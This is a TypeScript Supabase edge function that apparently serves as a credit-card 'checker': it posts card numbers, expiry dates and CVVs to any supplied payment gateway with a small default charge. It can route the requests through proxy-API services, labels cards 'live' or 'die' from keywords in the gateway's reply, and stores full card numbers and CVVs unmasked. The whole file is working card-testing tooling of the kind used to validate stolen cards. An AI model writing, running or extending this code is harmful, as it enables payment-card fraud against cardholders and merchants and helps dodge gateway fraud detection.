import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    gatewayUrl: string;
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
}

// Helper function for Luhn algorithm (if needed, not provided in original snippet but common for card validation)
// function luhnCheck(cardNumber: string): boolean { /* ... */ }

// Helper function to get BIN details (if needed)
// async function getBinDetails(cardNumber: string): Promise<any> { /* ... */ }

async function testCardOnGateway(
    cardData: TestCardRequest,
    gatewayUrl: string
): Promise<{ status: 'live' | 'die' | 'unknown'; amount?: number; message: string; responseTimeMs: number }> {
    const startTime = Date.now();

    try {
        // REAL GATEWAY IMPLEMENTATION
        const payload = {
            cc: cardData.cardNumber,
            mes: cardData.expMonth,
            ano: cardData.expYear,
            cvv: cardData.cvv,
            amount: cardData.amount || 1.00, // Use provided amount or default
        };

        // Prepare fetch options
        const fetchOptions: RequestInit = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'CheckerZaga/1.0'
            },
            body: JSON.stringify(payload)
        };

        // Handle Proxy (If provided)
        // Note: Deno Deploy doesn't support native proxying in fetch easily without 3rd party libs or specific enterprise features.
        // However, if the user provides a "Proxy API" URL (e.g. ScraperAPI), we can adjust the URL.
        // For standard HTTP proxies, we would need a custom agent, which is complex in Deno Deploy.
        // For now, we will assume the user might be using a Proxy API service where you send the target URL as a param.
        // OR if they provided a standard proxy, we'll try to use it if the environment supports it (limited support).

        // If proxyUrl looks like a Proxy API (e.g., has 'url=' param), we use that.
        let targetUrl = gatewayUrl;
        if (cardData.proxyUrl) {
            if (cardData.proxyUrl.includes('url=')) {
                // It's likely a Proxy API (like ScraperAPI, ZenRows)
                // We append the target URL to it
                targetUrl = `${cardData.proxyUrl}${encodeURIComponent(gatewayUrl)}`;
            } else {
                // It's a standard proxy string (http://user:pass@host:port)
                // Deno `fetch` doesn't support this directly in standard mode easily.
                // We will log a warning that standard proxies might not work without a specific client.
                console.warn('Standard proxy URL provided. Deno native fetch might not route through this without custom agent.');
                // For this implementation, we'll proceed directly but note the limitation.
            }
        }

        const response = await fetch(targetUrl, fetchOptions);

        const responseTimeMs = Date.now() - startTime;

        // ... (keep existing response parsing logic)
        let responseData;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            responseData = await response.json();
        } else {
            responseData = await response.text();
        }

        // LOGIC TO DETERMINE STATUS
        const responseString = JSON.stringify(responseData).toLowerCase();

        let status: 'live' | 'die' | 'unknown' = 'die';
        let message = 'Declined';
        let amount = cardData.amount;

        if (responseString.includes('approved') || responseString.includes('sucesso') || responseString.includes('authorized')) {
            status = 'live';
            message = 'Approved';
        } else if (responseString.includes('insufficient') || responseString.includes('sem saldo')) {
            status = 'die';
            message = 'Insufficient Funds';
        } else if (responseString.includes('error') || responseString.includes('invalid')) {
            status = 'unknown';
            message = 'Gateway Error / Invalid Data';
        } else {
            if (response.ok) {
                status = 'die';
                message = 'Declined (Generic)';
            } else {
                status = 'unknown';
                message = `HTTP Error ${response.status}`;
            }
        }

        return {
            status,
            amount,
            message: typeof responseData === 'string' ? responseData.substring(0, 100) : message,
            responseTimeMs
        };

    } catch (error) {
        return {
            status: 'unknown',
            message: `Request Failed: ${error.message}`,
            responseTimeMs: Date.now() - startTime,
        };
    }
}

serve(async (req) => {
    if (req.method === 'OPTIONS') {
        return new Response('ok', { headers: corsHeaders });
    }

    try {
        const supabaseClient = createClient(
            Deno.env.get('SUPABASE_URL') ?? '',
            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
        );

        const requestData: TestCardRequest = await req.json();
        const { sessionId, cardNumber, expMonth, expYear, cvv, gatewayUrl, processingOrder, amount, proxyUrl } = requestData;

        // Validation
        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv || !gatewayUrl || processingOrder === undefined) {
            return new Response(
                JSON.stringify({ error: 'Missing required fields' }),
                { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
            );
        }

        // Call the new function to test the card
        const testResult = await testCardOnGateway(
            { sessionId, cardNumber, expMonth, expYear, cvv, gatewayUrl, processingOrder, amount, proxyUrl },
            gatewayUrl
        );

        // Store the result in Supabase
        const { data, error } = await supabaseClient
            .from('card_test_results')
            .insert([
                {
                    session_id: sessionId,
                    card_number: cardNumber, // Consider hashing or masking this for security
                    exp_month: expMonth,
                    exp_year: expYear,
                    cvv: cvv, // Consider not storing this or hashing
                    gateway_url: gatewayUrl,
                    processing_order: processingOrder,
                    status: testResult.status,
                    message: testResult.message,
                    amount: testResult.amount,
                    response_time_ms: testResult.responseTimeMs,
                },
            ]);

        if (error) {
            console.error('Error storing test result:', error);
            return new Response(
                JSON.stringify({ error: 'Failed to store test result', details: error.message }),
                { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
            );
        }

        return new Response(
            JSON.stringify({ success: true, testResult, storedData: data }),
            { status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );

    } catch (error) {
        console.error('Request processing error:', error);
        return new Response(
            JSON.stringify({ error: error.message }),
            { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
    }
});
